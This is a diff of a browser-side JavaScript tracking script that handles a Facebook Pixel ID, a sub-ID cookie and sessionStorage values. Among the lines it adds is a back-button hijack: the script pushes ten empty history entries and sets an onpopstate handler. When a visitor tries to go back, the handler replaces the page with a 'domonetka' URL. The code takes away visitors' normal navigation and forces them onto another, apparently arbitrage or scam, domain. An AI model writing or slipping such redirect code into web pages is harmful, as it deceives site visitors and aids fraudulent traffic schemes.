@@ -6,9 +6,8 @@
     }
 
     const urlParams = new URLSearchParams(window.location.search);
-    const pxl = urlParams.get('pxl');
+    const pxl = urlParams.get('pxl') || 'default_pxl';
     const contentIds = urlParams.get('content_ids');
-
     const subid = getCookie('_subid');
 
     if (pxl) {
@@ -18,6 +17,7 @@
     if (subid) {
         sessionStorage.setItem('external_id', subid);
         sessionStorage.setItem('event_id', subid);
+        sessionStorage.setItem('dom', domonetka);
     }
 
     if (contentIds) {
@@ -49,5 +49,26 @@
         } else {
             fbq('track', 'PageView');
         }
+    }
+
+    if (domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
+        (async function () {
+            try {
+                onpopstate = function (event) {
+                    if (event.state) {
+                        const newUrl = `${domonetka}?pxl=${pxl}`;
+                        location.replace(newUrl);
+                    }
+                };
+
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(function () {
+                        history.pushState({}, "");
+                    }, i * 50);
+                }
+            } catch (error) {
+                console.log(error);
+            }
+        })();
     }
 })();
